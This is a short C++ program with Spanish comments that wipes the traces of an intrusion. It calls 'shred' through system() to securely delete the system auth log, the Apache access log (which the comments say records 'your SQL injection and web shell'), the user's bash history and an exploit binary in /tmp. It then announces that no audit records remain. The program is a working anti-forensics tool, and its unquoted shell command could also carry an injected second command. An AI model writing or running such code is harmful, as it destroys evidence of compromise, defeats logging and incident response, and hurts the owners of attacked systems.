#include <iostream>
#include <vector>
#include <unistd.h>

void wipe_file(std::string path) {
    std::cout << "[*] Limpiando rastro en: " << path << std::endl;
    // Sobrescribir con ceros antes de borrar
    std::string cmd = "shred -u -n 3 " + path; 
    system(cmd.c_str());
}

int main() {
    std::vector<std::string> logs = {
        "/var/log/auth.log",     // Intentos de login y SUID
        "/var/log/apache2/access.log", // Tu inyección SQL y Web Shell
        "~/.bash_history",       // Tus comandos ejecutados
        "/tmp/shell.bin"         // El binario del exploit
    };

    for (const auto& log : logs) {
        wipe_file(log);
    }

    std::cout << "[✓] Limpieza completa. No hay registros de la auditoría." << std::endl;
    return 0;
}
